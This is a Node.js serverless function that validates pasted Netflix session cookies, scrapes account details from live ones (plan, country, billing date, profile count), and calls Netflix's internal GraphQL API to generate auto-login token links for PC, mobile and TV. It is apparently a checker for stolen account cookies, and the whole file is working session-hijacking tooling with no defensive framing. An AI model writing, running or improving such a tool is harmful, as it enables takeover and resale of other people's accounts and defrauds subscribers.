const axios = require('axios');

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  const rawCookie = req.body.cookie;
  if (!rawCookie) {
    return res.status(400).json({ error: 'No cookie provided' });
  }

  // 1. Parse the cookie
  const jar = {};
  const NF_COOKIES = ["NetflixId", "SecureNetflixId", "nfvdid"];
  
  if (rawCookie.includes("\t") || rawCookie.includes("netflix.com")) {
    for (const line of rawCookie.split("\n")) {
      const t = line.trim();
      if (!t || t.startsWith("#")) continue;
      const p = t.split("\t");
      if (p.length >= 7 && NF_COOKIES.includes(p[5])) jar[p[5]] = p[6];
    }
  } else {
    for (const part of rawCookie.split(/[;\n]/)) {
      const i = part.indexOf("=");
      if (i > 0) {
        const k = part.slice(0, i).trim();
        const v = part.slice(i + 1).trim();
        if (NF_COOKIES.includes(k)) jar[k] = v;
      }
    }
  }

  const cookieHeader = Object.entries(jar).map(([k, v]) => `${k}=${v}`).join("; ");
  if (!jar.NetflixId) return res.status(400).json({ status: 'dead', error: 'No NetflixId cookie found' });

  try {
    // 2. Check if the account is ALIVE or DEAD
    const accountRes = await axios.get('https://www.netflix.com/account', {
      headers: {
        'Cookie': cookieHeader,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36'
      },
      validateStatus: () => true,
      maxRedirects: 0
    });

    let status = 'dead';
    if (accountRes.status >= 300 && accountRes.status < 400) {
      const loc = accountRes.headers['location'] || '';
      status = loc.includes('login') ? 'expired' : 'dead';
    } else if (accountRes.status === 200) {
      status = 'alive';
    }

    if (status !== 'alive') {
      return res.json({ status });
    }

    // 3. Parse metadata (Plan, Country, etc.)
    const html = accountRes.data;
    const out = { status: 'alive' };
    
    let m = html.match(/"currentPlan"\s*:\s*\{[^}]*"planName"\s*:\s*"([^"]+)"/) || html.match(/"planName"\s*:\s*"([^"]+)"/);
    if (m) out.plan = m[1];
    
    m = html.match(/"countryOfSignup"\s*:\s*"([^"]+)"/);
    if (m) out.country = m[1];
    
    m = html.match(/"nextBillingDate"\s*:\s*"([^"]+)"/);
    if (m) out.nextBilling = m[1];
    
    const profCount = (html.match(/"profileName"/g) || []).length;
    if (profCount) out.profiles = profCount.toString();

    // 4. Generate NFToken for PC, Mobile, TV
    const links = { pc: null, mobile: null, tv: null };
    
    try {
      // Create auto login token via GraphQL (from nf-token-generator.py)
      const graphqlQuery = {
        operationName: "CreateAutoLoginToken",
        variables: {},
        extensions: {
          persistedQuery: {
            version: 1,
            id: "b6be5239a1081a33c924d9e2f7fc20db49b6e15e0d2e23bea51e8c3fbbdcc2ef" // Known Netflix persisted query ID for CreateAutoLoginToken
          }
        }
      };

      const tokenRes = await axios.post('https://www.netflix.com/api/shakti/mre/graphql', graphqlQuery, {
        headers: {
          'Cookie': cookieHeader,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36',
          'Content-Type': 'application/json'
        },
        validateStatus: () => true
      });

      if (tokenRes.status === 200 && tokenRes.data?.data?.createAutoLoginToken?.token) {
        const token = tokenRes.data.data.createAutoLoginToken.token;
        links.pc     = `https://netflix.com/?nftoken=${token}`;
        links.mobile = `https://netflix.com/unsupported?nftoken=${token}`;
        links.tv     = `https://netflix.com/tv2?nftoken=${token}`;
      }
    } catch (e) {
      console.log("NFToken Error:", e.message);
    }

    out.links = links;
    return res.json(out);

  } catch (error) {
    return res.status(500).json({ status: 'dead', error: error.message });
  }
};
